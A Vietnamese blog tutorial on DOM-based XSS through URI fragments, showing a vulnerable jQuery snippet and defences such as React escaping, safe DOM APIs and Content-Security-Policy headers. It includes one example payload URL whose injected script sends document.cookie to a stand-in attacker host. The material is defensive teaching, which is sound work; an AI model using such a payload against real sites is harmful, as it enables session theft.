# Giới thiệu
Một vài kiểu tấn công `xss` không yêu cầu lỗ hổng server. Nếu như site của bạn sử dụng `URI fragments` , bạn cần chắc chăn chúng không thể bị lạm dụng để tiêm mã độc Javascript. Không dài dòng nữa, mình sẽ demo luôn nhé.

# Cách thức hoạt động
Khi mà các `JS` frameworks trở nên chặt chẽ hơn, nhiều dev đang đẩy logic về phía client cũng tương đương với việc phải biết cách chống lỗ hổng xảy ra ở browser. Ứng dụng web thường sử dụng [URI](https://vi.wikipedia.org/wiki/URI) như một phần của [URL](https://vi.wikipedia.org/wiki/URL) phía sau dấu `#`. Nó là cách tiện dụng để lưu lại vị trí người dùng đang xem trong page, lưu lại lịch sử duyệt web, nhưng không cần lượn vài vòng đến server :))

`URI fragments` không gửi với HTTP requests, vậy nên chúng cần thông dịch vời client-side JS. Bạn nên cẩn thận rằng việc xử lý các đoạn `URI` không cho phép inject JavaScript độc hại. Hãy xem một trang web có thể dễ bị tổn thương bởi `DOM-BASED XSS` như thế nào nhé :)

Ví dụ website có `infinite scroll`: nội dung được load động khi page được  cuộn xuống. Nếu như người dùng bị điều hướng tới tới site khác, và khi nhấn nút back, site có thể reload lại nội dung cuối cùng họ xem. Tuy nhiên, có một lỗ hổng khi dùng cách này . Site update số trang chuyển hướng từ `URI fragments`, và không kiểm tra nội dung:
```js
$(document).onload(function() {
  var page = window.location.hash;
  loadPage(page);

  $("#page-no").html(page);
});
```
Điều này có nghĩa là kẻ tấn công có thể xây dựng `URL` với mã Js độc trong `URI`, và khi có ai đó bị lừa truy cập vào `URL` đó, đoạn JS sẽ được thực thi trên trình duyệt của họ. Ví dụ với đường dẫn `www.chinterest.com#<script>window.location="http://www.haxxed.com?cookie="+document.cookie</script>` được chuyển thành `haxxed.com?cookie=asFFEfn222fefeknladas`.

Ao kay, bạn có thể thấy là nó nguy hiểm phết đấy chứ nhỉ.
# Rủi do
`XSS` là một trong những cách phổ biến nhất mà hacker sử dụng để tấn công. Lỗ hổng `XSS`  cho phép đoạn mã độc có thể thực thi tùy ý khi nạn nhân truy cập vào trang của bạn.

Nhìn chung đây là lỗi cũng khá là hiếm gặp, dễ khai thác, và cũng rất nguy hiểm. Bất kỳ trang nào sử dụng các đoạn URI đều có khả năng gặp rủi ro từ các cuộc tấn công XSS.

# Bảo vệ
### Sử dụng Javascript framework
Các framework như là `AngularJS` và `React` sử dụng templates cho việc xây dựng `ad-hoc HTML` trở thành một hành động rõ dàng. Nó sẽ đẩy team dev của chúng ra hướng tới các best practices, và khiến cho các hoạt động không an toàn trở nên dễ phát hiện hơn.

Trong `React`, bất cứ nội dung động nào được biết trong dấu ngoặc nhọn sẽ tự động được `escaped`, do đó nó sẽ trở nên an toàn như đoạn mã sau:
```js:react
render() {
  return <div>{dynamicContent}</div>
}
```
`React` cũng cho phép bạn show ra raw html bằng cách bingding content vào thuộc tính `dangerouslySetInnerHTML`, nó được đặt tên như vậy là để nhắc nhở về tính rủi do khi sử dụng. Đây là đoạn code ví dụ
```js:react
render() {
  return <div dangerouslySetInnerHTML={ __html: dynamicContent } />
}
```
### Kiểm tra code của bạn cẩn thận
Thỉnh thoảng Js framework quá nặng cho website của bạn. Trong trường hợp này bạn sẽ cần thường xuyên tiến hành review code để tham chiếu những chỗ sử dụng `window.location.hash`. Xem xét đưa ra các tiêu chuẩn về về sử dụng `URI` và tập trung phần logic này trong phần lõi của thư viện.

Chẳng hạn như `JQuery`, cẩn thận kiểm tra những chỗ sử dụng hàm `html()` và sử dụng thay thế nó bằng `text()` khi có thể bởi vì nếu in ra raw html sẽ rất nguy hiểm.

Nếu bạn sử dụng nateive DOM APIs, tránh những thuộc tính và hàm sau:
* [innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML)
* [outerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/outerHTML)
* [document.write](https://developer.mozilla.org/en-US/docs/Web/API/Document/write)

Thay vào đó, đặt nội dung bên trong thẻ bất cứ khi nào có thể:
* [innerText](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerText)
* [textContent](https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent)

### Parse JSON cẩn thận
Chẳng hạn thay vì sử dụng `evel(...)` thì chúng ta sẽ sử dụng `JSON.parse(...)`.

### Phát hiện code không an toàn băng cách sử dụng development Tools
Google đã release [Chrome plug-in](https://code.google.com/p/domsnitch) có thể nhận biết được nhưng đoạn code thúi **thường gặp** ở phía client.

### Implement a Content-Security Policy
Bằng cách settting `cntent security policy` trong `response header`, bạn có thể cho trình duyệt biết là không được phép thực thi mã inline JS, và khóa nhưng domain nào có thể lưu trữ JS cho page
```
Content-Security-Policy: script-src 'self' https://apis.google.com
```
Hoặc đặt trong thẻ `<meta>`
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self' https://apis.google.com">
```
Bằng cách thêm `report-uri` trong policy header, trình duyệt sẽ cảnh báo bạn trước mọi policy violations thay vì ngăn chặn inline JS thực thi:
```
Content-Security-Policy-Report-Only: script-src 'self'; report-uri http://example.com/csr-reports
```

Và cuối cùng: **Don’t Use URI Fragments At All!**

# Tổng kết
Trên đây là kiến thức về `DOM-BASED XSS`, hy vọng sẽ hữu ích cho bạn. Happy coding ! <3